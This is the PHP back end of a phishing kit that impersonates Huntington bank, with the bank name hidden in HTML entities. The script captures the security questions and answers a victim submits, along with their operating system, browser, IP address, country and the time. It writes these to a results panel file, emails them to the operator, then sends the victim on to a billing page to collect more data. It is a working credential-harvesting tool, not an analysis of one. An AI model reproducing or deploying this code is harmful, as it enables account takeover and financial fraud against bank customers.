<?php
@session_start();
@error_reporting(0);
include("./country.php");
include("./os.php");
$InfoDATE   = date("d-m-Y h:i:sa");
$OS = getOS($_SERVER['HTTP_USER_AGENT']);
$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);
$_SESSION['browser'] = $browserTy_Version = array_pop($browser); 
$ip = $_SERVER['REMOTE_ADDR'];


$Q1 = $_SESSION['Q1'] = $_POST['Q1'];
$Q2 = $_SESSION['Q2'] = $_POST['Q2'];
$Q3 = $_SESSION['Q3'] = $_POST['Q3'];
$A1 = $_SESSION['A1'] = $_POST['A1'];
$A2 = $_SESSION['A2'] = $_POST['A2'];
$A3 = $_SESSION['A3'] = $_POST['A3'];

$messege = '<h3 style="font-weight: 400; margin: 10px 0; font-size: 24px;color: #69BE2E">
&#72;&#117;&#110;&#116;&#105;&#110;&#103;&#116;&#111;&#110;&#32;&#81;&#117;&#101;&#115;&#116;&#105;&#111;&#110;&#115;
</h3>
<HR>
<h2 style="font-weight: 400; margin: 10px 0;color: #69BE2E">Security Question 1 : '.$_SESSION["Q1"].' </h2>
<h2 style="font-weight: 400; margin: 10px 0;color: #69BE2E">Security Answег1 : '.$_SESSION["A1"].' </h2>
<h2 style="font-weight: 400; margin: 10px 0;color: #69BE2E">Security Question 2 : '.$_SESSION["Q2"].' </h2>
<h2 style="font-weight: 400; margin: 10px 0;color: #69BE2E">Security Answег 2 : '.$_SESSION["A2"].' </h2>
<h2 style="font-weight: 400; margin: 10px 0;color: #69BE2E">Security Question 3 : '.$_SESSION["Q3"].' </h2>
<h2 style="font-weight: 400; margin: 10px 0;color: #69BE2E">Security Answег 3 : '.$_SESSION["A3"].' </h2>
<HR>
<h2 style="font-weight: 400; margin: 10px 0;color: #69BE2E">system : '.$OS.' </h2>
<h2 style="font-weight: 400; margin: 10px 0;color: #69BE2E">browser : '.$browserTy_Version.' </h2>
<h2 style="font-weight: 400; margin: 10px 0;color: #69BE2E">ip address : '.$_SERVER["REMOTE_ADDR"].' </h2>
<h2 style="font-weight: 400; margin: 10px 0;color: #69BE2E">country : '.$country.' </h2>
<h2 style="font-weight: 400; margin: 10px 0;color: #69BE2E">date time : '.$InfoDATE.' </h2>
<HR>
';


include("../config.php"); 
$f = fopen("../Result_Panel.php", "a");fwrite($f, $messege);
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$subject  = "Huntington Questions [".$_SERVER['REMOTE_ADDR']."] ";
$headers .= "From: Questions_BY_OReoo" . "\r\n";
mail($yourmail, $subject, $messege, $headers);
header("Location: ../app/Bill.php");
?>